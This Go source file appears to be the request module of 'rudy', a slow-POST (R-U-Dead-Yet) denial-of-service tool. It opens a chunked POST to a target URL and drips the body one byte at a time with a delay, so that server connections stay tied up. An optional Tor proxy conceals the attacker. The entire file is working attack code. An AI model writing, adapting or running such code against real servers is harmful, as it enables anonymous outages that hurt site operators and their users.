package request

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"time"

	"github.com/darkweak/rudy/logger"
)

type request struct {
	client      *http.Client
	delay       time.Duration
	payloadSize int64
	req         *http.Request
}

func NewRequest(size int64, u string, delay time.Duration) *request {
	req, _ := http.NewRequest(http.MethodPost, u, nil)
	req.ProtoMajor = 1
	req.ProtoMinor = 1
	req.TransferEncoding = []string{"chunked"}
	req.Header = make(map[string][]string)

	return &request{
		client:      http.DefaultClient,
		delay:       delay,
		payloadSize: size,
		req:         req,
	}
}

func (r *request) WithTor(endpoint string) *request {
	torProxy, err := url.Parse(endpoint)
	if err != nil {
		panic("Failed to parse proxy URL:" + err.Error())
	}

	var transport http.Transport
	transport.Proxy = http.ProxyURL(torProxy)
	r.client.Transport = &transport

	return r
}

func (r *request) Send() error {
	pipeReader, pipeWriter := io.Pipe()
	r.req.Body = pipeReader
	closerChan := make(chan int)

	defer close(closerChan)

	go func() {
		buf := make([]byte, 1)
		newBuffer := bytes.NewBuffer(make([]byte, r.payloadSize))

		defer pipeWriter.Close()

		for {
			select {
			case <-closerChan:
				return
			default:
				if n, _ := newBuffer.Read(buf); n == 0 {
					break
				}

				_, _ = pipeWriter.Write(buf)

				logger.Logger.Sugar().Infof("Sent 1 byte of %d to %s", r.payloadSize, r.req.URL)
				time.Sleep(r.delay)
			}
		}
	}()

	var err error
	if _, err = r.client.Do(r.req); err != nil {
		err = fmt.Errorf("an error occurred during the request: %w", err)
		logger.Logger.Sugar().Error(err)
		closerChan <- 1
	}

	return err
}
